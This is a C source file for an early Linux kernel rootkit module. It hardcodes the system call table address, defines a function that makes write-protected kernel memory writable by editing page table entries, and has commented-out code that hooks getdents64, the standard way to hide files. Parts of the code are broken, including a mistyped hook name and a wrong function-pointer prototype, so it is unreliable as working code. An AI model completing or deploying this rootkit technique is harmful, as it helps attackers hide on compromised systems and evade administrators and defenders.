//allows us to perform certain kernel-level operations, such as printk
#include <linux/kernel.h>
//allows us to create the module
#include <linux/module.h>
//allows us to change memory protection settings for the system call table
#include <linux/highmem.h>
//contains the system call numbers
#include <asm/unistd.h>

#include <linux/dirent.h>

unsigned long * sys_call_table;

asmlinkage int (*real_getdents) (unsigned int, struct linux_dirent, unsigned int);
/*
asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
        printk(KERN_INFO "getdents is called through hijacked call.\n");

        return real_getdents(fd, dirp, count);
}
*/


// make the address writable if it is write-protected.
int make_rw(unsigned long address){
	unsigned int level;
      	pte_t *pte = lookup_address(address, &level);
	if(pte->pte &~ _PAGE_RW)
	pte->pte |= _PAGE_RW;
	return 0;
}


/*
void hijack_sys_call_table(){
	make_rw((unsigned long)sys_call_table);
        real_getdents = (void*)*(sys_call_table + __NR_getdents64);
        *(sys_call_table + __NR_getdents64) = (unsigned long)hijacked_getdents_;
}
*/
int init_module(void){
	
	/*
	pointer to the system call table. The address is currently hardcoded,
	taken from the /boot/System map file. This address seems to be the same
	after every boot, so for now it can be hardcoded.
	*/
	sys_call_table = (unsigned long*)0xc1688140;	
	
	
	printk(KERN_INFO "Rootkit added.\n");
	
	return 0;
}

void cleanup_module(void){
	printk(KERN_INFO "Rootkit removed.\n");
}
